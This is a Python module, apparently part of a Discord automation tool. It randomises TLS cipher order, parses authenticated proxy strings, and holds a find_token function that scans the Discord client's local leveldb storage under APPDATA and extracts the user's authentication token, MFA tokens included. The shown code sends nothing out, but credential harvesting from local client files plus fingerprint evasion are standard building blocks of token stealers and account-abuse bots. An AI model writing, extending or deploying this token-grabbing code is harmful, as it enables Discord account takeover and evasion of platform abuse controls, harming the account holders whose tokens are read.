from base64 import b64encode
from glob import glob
import random
import ssl
import os
import re

def create_ssl_context():
    ctx = ssl.create_default_context()
    ciphers = ctx.get_ciphers()
    random.shuffle(ciphers)
    ctx.set_ciphers(":".join(c["name"] for c in ciphers))
    return ctx

def parse_proxy_string(proxy_str):
    if not proxy_str:
        return
        
    proxy_str = proxy_str.rpartition("://")[2]
    auth, _, fields = proxy_str.rpartition("@")
    fields = fields.split(":", 2)

    if len(fields) == 2:
        hostname, port = fields
        if auth:
            auth = "Basic " + b64encode(auth.encode()).decode()
        addr = (hostname.lower(), int(port))
        return auth, addr

    elif len(fields) == 3:
        hostname, port, auth = fields
        auth = "Basic " + b64encode(auth.encode()).decode()
        addr = (hostname.lower(), int(port))
        return auth, addr
    
    raise Exception(f"Unrecognized proxy format: {proxy_str}")

def find_token():
    token_patterns = (
        re.compile(r'mfa\.(?:[A-Za-z0-9+_\-/]{20,})'),
        re.compile(r'(?:[A-Za-z0-9+/]{4,})\.(?:[A-Za-z0-9+/]{4,})\.(?:[A-Za-z0-9+/]{4,})')
    )
    db_pattern = os.environ["APPDATA"] + "/discord/Local Storage/leveldb/*.ldb"
    for db_path in sorted(glob(db_pattern), reverse=True):
        with open(db_path, "rb") as fp:
            for field in fp.read().split(b'"')[::-1]:
                try:
                    field = field.decode("ascii")
                except UnicodeDecodeError:
                    continue
                if any(pattern.match(field) for pattern in token_patterns):
                    return field
    raise Exception("Could not find discord token.")